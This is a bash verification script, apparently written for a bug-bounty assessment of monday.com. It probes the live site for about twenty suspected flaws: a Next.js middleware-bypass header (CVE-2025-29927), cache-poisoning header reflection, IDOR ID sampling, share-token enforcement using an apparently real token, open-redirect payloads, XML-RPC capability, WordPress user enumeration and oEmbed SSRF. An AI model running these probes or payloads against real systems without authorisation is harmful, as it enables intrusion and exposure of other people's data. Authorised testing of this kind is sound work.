#!/usr/bin/env bash
# verify.sh - run the bug-candidate checks from reports/bug-candidates.md
#
# Passive and bounded: GETs, HEADs, one XML-RPC capability probe, and small
# rate-limited ID samples. No brute force, no fuzzing, no writes.
# Cache probes always use a unique cache-buster so no real URL is poisoned.
#
#   bash tools/verify.sh              # all checks
#   bash tools/verify.sh 01 06 09     # only these
#
# Only run this against a target you are authorised to test.

set -uo pipefail

DELAY="${DELAY:-1}"
BID="${BID:-f8386b8abfa0c30976f388dea89ed0363ecb1df0}"
UA="${UA:-Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36}"
OUT="${OUT:-verify-out}"
mkdir -p "$OUT"

C_R=$'\033[31m'; C_G=$'\033[32m'; C_Y=$'\033[33m'; C_B=$'\033[1m'; C_0=$'\033[0m'
WANT=("$@")

want() { [ ${#WANT[@]} -eq 0 ] && return 0; for w in "${WANT[@]}"; do [ "$w" = "$1" ] && return 0; done; return 1; }
hdr()  { printf '\n%s=== BUG-%s — %s%s\n' "$C_B" "$1" "$2" "$C_0"; }
note() { printf '  %s>%s %s\n' "$C_Y" "$C_0" "$*"; }
hit()  { printf '  %s!! %s%s\n' "$C_R" "$*" "$C_0"; }
ok()   { printf '  %s.. %s%s\n' "$C_G" "$*" "$C_0"; }

# code+size for a URL, extra curl args passed through
probe() {
  local url="$1"; shift
  curl -sS -o /dev/null -w '%{http_code} %{size_download}' -A "$UA" --max-time 20 "$@" "$url" 2>/dev/null || echo "ERR 0"
  sleep "$DELAY"
}
body() {
  local url="$1"; shift
  curl -sS -A "$UA" --max-time 20 "$@" "$url" 2>/dev/null
  sleep "$DELAY"
}
heads() {
  local url="$1"; shift
  curl -sSI --suppress-connect-headers -A "$UA" --max-time 20 "$@" "$url" 2>/dev/null
  sleep "$DELAY"
}

# ---------------------------------------------------------------- BUG-01
if want 01; then
hdr 01 "Next.js middleware bypass (CVE-2025-29927)"
  note "version fingerprint"
  heads https://monday.com/ | grep -iE 'x-powered-by|server:|x-nextjs' | sed 's/^/     /'
  body https://monday.com/nhp/_next/static/chunks/framework-355174a933119eba.js \
    | grep -oE '"[0-9]+\.[0-9]+\.[0-9]+"' | sort -u | head -5 | sed 's/^/     react-ish version: /'
  note "baseline vs x-middleware-subrequest on /"
  b=$(probe https://monday.com/)
  h1=$(probe https://monday.com/ -H 'x-middleware-subrequest: middleware')
  h2=$(probe https://monday.com/ -H 'x-middleware-subrequest: src/middleware')
  h3=$(probe https://monday.com/ -H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware')
  echo "     baseline=$b  hdr1=$h1  hdr2=$h2  hdr3=$h3"
  if [ "$b" != "$h1" ] || [ "$b" != "$h2" ] || [ "$b" != "$h3" ]; then
    hit "response CHANGED with the header — retest against a genuinely gated path"
  else
    ok "no difference on / (expected; retest on an auth-gated path if you find one)"
  fi
fi

# ---------------------------------------------------------------- BUG-02
if want 02; then
hdr 02 "OAuth metadata / dynamic client registration"
  for e in oauth-authorization-server oauth-protected-resource api-catalog; do
    r=$(probe "https://monday.com/.well-known/$e")
    echo "     $e -> $r"
    case "$r" in 200*) body "https://monday.com/.well-known/$e" > "$OUT/$e.json"
                       grep -oE '"(registration|authorization|token|revocation|jwks_uri)_endpoint"[^,]*' "$OUT/$e.json" | sed 's/^/       /'
                       grep -q registration_endpoint "$OUT/$e.json" && hit "registration_endpoint present — test unauthenticated POST manually" ;;
    esac
  done
fi

# ---------------------------------------------------------------- BUG-03
if want 03; then
hdr 03 "GraphQL schema"
  r=$(probe 'https://api.monday.com/v2/get_schema?format=sdl')
  echo "     get_schema?format=sdl -> $r"
  case "$r" in 200*)
    body 'https://api.monday.com/v2/get_schema?format=sdl' > "$OUT/schema.sdl"
    echo "     lines: $(wc -l < "$OUT/schema.sdl")"
    echo "     types: $(grep -cE '^\s*type ' "$OUT/schema.sdl")   deprecated: $(grep -c deprecated "$OUT/schema.sdl")"
    ok "saved $OUT/schema.sdl — diff it against developer.monday.com docs" ;;
  esac
fi

# ---------------------------------------------------------------- BUG-04
if want 04; then
hdr 04 "MCP / agent-skills surface"
  for e in mcp.json agent-skills/index.json; do
    r=$(probe "https://monday.com/.well-known/$e")
    echo "     $e -> $r"
    case "$r" in 200*) body "https://monday.com/.well-known/$e" > "$OUT/$(basename "$e")"
                       head -c 400 "$OUT/$(basename "$e")" | sed 's/^/       /'; echo ;;
    esac
  done
fi

# ---------------------------------------------------------------- BUG-05
if want 05; then
hdr 05 "cache-key / normalisation mismatch"
  note "same resource with and without %20 (cache status)"
  heads 'https://monday.com/partners/aws/'    | grep -iE 'cf-cache-status|age:|vary' | sed 's/^/     plain  /'
  heads 'https://monday.com/partners/aws/%20' | grep -iE 'cf-cache-status|age:|vary' | sed 's/^/     %20    /'
  heads 'https://monday.com//workcanvas.com'  | grep -iE 'cf-cache-status|location'  | sed 's/^/     dslash /'
  note "unkeyed header reflection (unique cache-buster, safe)"
  CB="cb$RANDOM$RANDOM"
  body "https://monday.com/?$CB=1" -H 'X-Forwarded-Host: canary.example' > "$OUT/cp1.html"
  n=$(grep -c 'canary.example' "$OUT/cp1.html")
  echo "     reflections of injected host: $n"
  [ "$n" -gt 0 ] && hit "X-Forwarded-Host is reflected — check whether it caches for others"
  [ "$n" -eq 0 ] && ok "no reflection"
fi

# ---------------------------------------------------------------- BUG-06
if want 06; then
hdr 06 "_next/data JSON endpoints"
  r=$(probe "https://monday.com/nhp/_next/static/$BID/_buildManifest.js")
  echo "     _buildManifest.js -> $r"
  case "$r" in 200*)
    body "https://monday.com/nhp/_next/static/$BID/_buildManifest.js" > "$OUT/_buildManifest.js"
    grep -oE '"/[^"]*"' "$OUT/_buildManifest.js" | tr -d '"' | grep -v '\.js$' | sort -u > "$OUT/routes.txt"
    echo "     routes discovered: $(wc -l < "$OUT/routes.txt")"
    ok "saved $OUT/routes.txt"
    note "sampling first 5 data endpoints"
    head -5 "$OUT/routes.txt" | while read -r rt; do
      echo "     $rt -> $(probe "https://monday.com/_next/data/$BID${rt}.json")"
    done ;;
  esac
fi

# ---------------------------------------------------------------- BUG-07/08
if want 07; then
hdr 07 "solution_id IDOR (bounded sample)"
  for id in 10005145 10005151 10005560 10005565 10005919 10016423 80437; do
    echo "     $id -> $(probe "https://auth.monday.com/solutions/add_solution?solution_id=$id")"
  done
  note "compare against a known-good id"
  echo "     80436 (known) -> $(probe 'https://auth.monday.com/solutions/add_solution?solution_id=80436')"
fi

if want 08; then
hdr 08 "share-token enforcement / marketplace IDs"
  echo "     no token      -> $(probe 'https://view.monday.com/4923960784')"
  echo "     wrong token   -> $(probe 'https://view.monday.com/4923960784-00000000000000000000000000000000')"
  echo "     real token    -> $(probe 'https://view.monday.com/4923960784-912829ab7717efb7fb86898ff6f59cbb')"
  for id in 10 11 13 21 22 24 132 10000006; do
    echo "     marketplace/$id -> $(probe "https://monday.com/marketplace/$id")"
  done
fi

# ---------------------------------------------------------------- BUG-09/10/11
if want 09; then
hdr 09 "WordPress core version"
  body https://monday.com/l/ | grep -oE 'content="WordPress [0-9.]+"' | sed 's/^/     meta: /'
  body https://monday.com/l/feed/ | grep -iE '<generator>' | sed 's/^/     feed: /'
  echo "     asset ?ver= stamps from crawl: 6.7.1 (core), jQuery 3.7.1, migrate 3.4.1"
  note "6.7.1 shipped Nov 2024 — check it against current security releases"
fi

if want 10; then
hdr 10 "word-2-html plugin 1.0.59"
  echo "     readme.txt -> $(probe 'https://monday.com/l/wp-content/plugins/word-2-html/readme.txt')"
  body 'https://monday.com/l/wp-content/plugins/word-2-html/readme.txt' | grep -iE 'stable tag|tested up to|requires' | sed 's/^/     /'
  echo "     plugin dir -> $(probe 'https://monday.com/l/wp-content/plugins/word-2-html/')"
fi

if want 11; then
hdr 11 "directory listings"
  for p in /l/wp-content/cache/min/1/ /l/wp-content/cache/min/ /l/wp-content/cache/ \
           /l/wp-content/uploads/ /l/wp-content/plugins/ /l/wp-content/themes/airfleet/; do
    r=$(probe "https://monday.com$p")
    echo "     $p -> $r"
    case "$r" in 200*) hit "200 on $p — confirm it is an index listing, not a page" ;; esac
  done
fi

# ---------------------------------------------------------------- BUG-12
if want 12; then
hdr 12 "open redirect: origin param and // paths"
  for v in 'https://example.org' '//example.org' 'https://monday.com.example.org' '/\/example.org'; do
    loc=$(heads "https://auth.monday.com/users/sign_up_new?origin=$(printf %s "$v" | sed 's|/|%2F|g;s|:|%3A|g')" | grep -i '^location:' | tr -d '\r')
    echo "     origin=$v -> ${loc:-<no redirect>}"
    case "$loc" in *example.org*) hit "off-domain redirect" ;; esac
  done
  loc=$(heads 'https://monday.com//example.org' | grep -i '^location:' | tr -d '\r')
  echo "     //example.org -> ${loc:-<no redirect>}"
fi

# ---------------------------------------------------------------- BUG-13/14
if want 13; then
hdr 13 "xmlrpc.php capability probe"
  r=$(probe https://monday.com/l/xmlrpc.php)
  echo "     GET xmlrpc.php -> $r"
  m=$(body https://monday.com/l/xmlrpc.php -X POST -H 'Content-Type: text/xml' \
      --data '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>' \
      | grep -oE '<string>[^<]+</string>' | sed 's/<[^>]*>//g')
  echo "$m" | head -20 | sed 's/^/     /'
  echo "$m" | grep -q 'pingback.ping'    && hit "pingback.ping available (blind SSRF primitive)"
  echo "$m" | grep -q 'system.multicall' && hit "system.multicall available (login rate-limit amplification)"
  [ -z "$m" ] && ok "no methods returned"
fi

if want 14; then
hdr 14 "WordPress user enumeration"
  r=$(probe 'https://monday.com/l/wp-json/wp/v2/users')
  echo "     wp/v2/users -> $r"
  case "$r" in 200*) body 'https://monday.com/l/wp-json/wp/v2/users' | head -c 500 | sed 's/^/     /'; echo
                     hit "users endpoint readable" ;; esac
  loc=$(heads 'https://monday.com/l/?author=1' | grep -i '^location:' | tr -d '\r')
  echo "     ?author=1 -> ${loc:-<no redirect>}"
  case "$loc" in *author*) hit "author slug disclosed via redirect" ;; esac
fi

# ---------------------------------------------------------------- BUG-15/16
if want 15; then
hdr 15 "cleartext links and HSTS"
  heads 'http://auth.monday.com/solutions/add_solution?solution_id=80436' | head -3 | sed 's/^/     /'
  heads https://monday.com/ | grep -i 'strict-transport-security' | sed 's/^/     /'
fi

if want 16; then
hdr 16 "Cloudflare email obfuscation"
  body https://monday.com/l/legal/tos/ | grep -oE 'data-cfemail="[0-9a-f]+"' | head -5 | sed 's/^/     /'
  note "decode: k=int(h[:2],16); chr(int(h[i:i+2],16)^k) for i in range(2,len(h),2)"
fi

# ---------------------------------------------------------------- BUG-19/20
if want 19; then
hdr 19 "region parameter validation"
  for v in use1 euc1 apse2 xxxx; do
    echo "     r=$v -> $(probe "https://forms.monday.com/forms/9f862eef0081db8c8b6e1f9f574bdabf?r=$v")"
  done
fi

if want 20; then
hdr 20 "parameter reflection + oembed SSRF"
  CAN="zzq$RANDOM"
  n=$(body "https://monday.com/crm?selectedTag=$CAN" | grep -c "$CAN")
  echo "     selectedTag reflections: $n"
  [ "$n" -gt 0 ] && hit "selectedTag reflected — check encoding context"
  echo "     oembed embed?url=external -> $(probe 'https://monday.com/l/wp-json/oembed/1.0/embed?url=https://example.org/')"
  echo "     oembed proxy?url=external -> $(probe 'https://monday.com/l/wp-json/oembed/1.0/proxy?url=https://example.org/')"
fi

printf '\n%sdone — artefacts in %s/%s\n' "$C_B" "$OUT" "$C_0"
